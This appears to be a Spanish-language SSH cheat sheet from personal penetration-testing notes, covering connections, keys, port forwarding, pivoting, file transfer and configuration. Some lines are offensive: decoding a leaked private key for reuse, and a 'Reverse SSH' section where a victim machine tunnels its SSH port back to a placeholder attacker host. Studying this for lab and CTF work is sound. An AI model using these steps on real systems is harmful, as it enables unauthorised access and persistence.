# SSH — Cheat Sheet

> Acceso remoto, túneles, pivoting.

---

## Conexión básica

```bash
ssh <user>@<host>                # Conectar
ssh <user>@<host> -p <port>     # Puerto personalizado
ssh -i key.pem <user>@<host>    # Con llave privada
```

## Generación de llaves

```bash
ssh-keygen -t rsa -b 4096       # Generar par de llaves
chmod 600 id_rsa                 # Permisos obligatorios de la llave
ssh-copy-id <user>@<host>        # Copiar llave pública al servidor
cat clave.txt | base64 -d > id_rsa  # Decodificar llave filtrada (base64)
```

## Túneles SSH

```bash
# Local port forwarding
ssh -L 8080:127.0.0.1:80 <user>@<host>
# Puerto 8080 local → host:80

# Remote port forwarding
ssh -R 4444:127.0.0.1:4444 <user>@<host>
# Puerto 4444 remoto → local:4444

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 <user>@<host>
# Proxy SOCKS en puerto 1080
```

## Pivoting

```bash
# SSH tunnel con ProxyJump
ssh -J <jump_host> <target_host>

# SSH tunnel encadenado
ssh -L 3306:127.0.0.1:3306 <user>@<jump>
# Desde jump:
ssh -L 3307:127.0.0.1:3306 <user>@<target>
```

## Transferencia de archivos

```bash
scp <file> <user>@<host>:<path>         # Subir archivo
scp <user>@<host>:<path> <file>         # Descargar archivo
scp -r <dir> <user>@<host>:<path>       # Directorio recursivo
sftp <user>@<host>                      # SFTP interactivo
```

## Configuración

```bash
# ~/.ssh/config
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3

Host htb
    HostName 10.10.10.x
    User user
    IdentityFile ~/.ssh/id_rsa
    StrictHostKeyChecking no
```

## Opciones útiles

```bash
-f                               # Background después de autenticación
-N                               # Sin comando remoto
-g                               # Permitir conexiones a puerto forwarding
-C                               # Compresión
-v                               # Verbose (debug)
-q                               # Quiet
```

## Reverse SSH

```bash
# En la víctima:
ssh -R 4444:127.0.0.1:22 <user>@<attacker>
# En el atacante:
ssh -p 4444 <user>@127.0.0.1
```









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[Linux.md|Linux]] — Desarrollo Web, Linux, Metodologia Pentest
- [[../../comandos/SSH.md|SSH]] — Desarrollo Web, Linux, Metodologia Pentest
- [[../../apuntes Andres/09.06.2026 Escalada de Privilegios y Hacking Web Máquina Ridiculously Easy II y Mr. Robot.md|09.06.2026 Escalada de Privilegios y Hacking Web Máquina Ridiculously Easy II y Mr. Robot]] — Desarrollo Web, Linux, Metodologia Pentest
- [[../../comandos/Tmux.md|Tmux]] — Desarrollo Web, Linux, Metodologia Pentest
- [[Hydra.md|Hydra]] — Desarrollo Web, Linux, Metodologia Pentest

### 🌐 Cross-Dominio

- [[../../../programacion/C/Networking_c.md|Networking_c]] — Programacion: Desarrollo Web, Linux, Redes
- [[../../../cloud/azure_functions.md|azure_functions]] — Cloud: Desarrollo Web, Linux, Redes

> #cloud_base #escalada_privilegios #hydra #linux #linux_ciber #metasploit #pentest #pivoting #redes #ssh_tool #tmux #web
